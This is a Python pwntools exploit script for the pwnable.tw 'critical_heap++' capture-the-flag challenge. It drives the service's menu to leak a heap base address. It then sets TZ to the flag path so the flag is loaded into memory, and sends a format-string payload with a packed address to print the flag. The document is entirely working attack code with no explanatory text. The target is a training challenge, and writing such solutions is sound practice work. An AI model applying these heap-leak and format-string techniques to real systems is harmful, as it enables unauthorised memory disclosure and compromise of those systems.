
from pwn import *

p = remote('chall.pwnable.tw', 10500)
#p = remote('localhost',56746)

context.log_level = 'debug'

def create_a_new_heap(name,type,content):
        p.sendlineafter('Your choice : ','1')
        p.sendlineafter('Name of heap:',name)
        if (type=='normal'):
                p.sendlineafter('Your choice : ','1')
                p.sendafter('Content of heap :',content)
        else:
                if (type=='clock'):
                        p.sendlineafter('Your choice : ','2')
                else:
                        p.sendlineafter('Your choice : ','3')

def play_sys_setname(index,name,value):
        p.sendlineafter('Your choice : ','4')
        p.sendlineafter('Index of heap :',str(index))
        p.sendlineafter('Your choice : ','1')
        p.sendafter('Give me a name for the system heap :',name)
        p.sendafter('Give me a value for this name :',value)
        p.sendlineafter('Your choice : ','5')


def play_sys_getvalue(index,name):
        p.sendlineafter('Your choice : ','4')
        p.sendlineafter('Index of heap :',str(index))
        p.sendlineafter('Your choice : ','4')
        p.sendafter('What\'s name do you want to see :',name)
        p.sendlineafter('Your choice : ','5')


def delete(index):
        p.sendlineafter('Your choice : ','5')
        p.sendlineafter('Index of heap :',str(index))

def show(index):
        p.sendlineafter('Your choice : ','2')
        p.sendlineafter('Index of heap :',str(index))

#lead_heap
create_a_new_heap('voht','system','')
play_sys_setname(0,'a'*4,'b'*4)
play_sys_getvalue(0,'a'*4)
delete(0)
create_a_new_heap('voht','normal','a'*8)
show(0)
p.recvuntil('aaaaaaaa')
heap_base_add = u64(p.recv(3).ljust(8,'\x00')) - 0x145
log.info('Heap base address:'+hex(heap_base_add))

#set TZ = '/home/critical_heap++/flag'
create_a_new_heap('voht','system','')
play_sys_setname(1,'TZ','/home/critical_heap++/flag')

#write flag string into heap
create_a_new_heap('voht','clock','')
flag_add = heap_base_add + 0x4d0

#play normal change content
p.sendlineafter('Your choice : ', '4')
p.sendlineafter('Index of heap :', '0')
p.sendlineafter('Your choice : ', '2')
p.sendlineafter('Content :','%c%c%c%c%c%c%c%c%c%c%c%s' + p64(flag_add))

#play normal show content
p.sendlineafter('Your choice : ','1')

p.interactive()
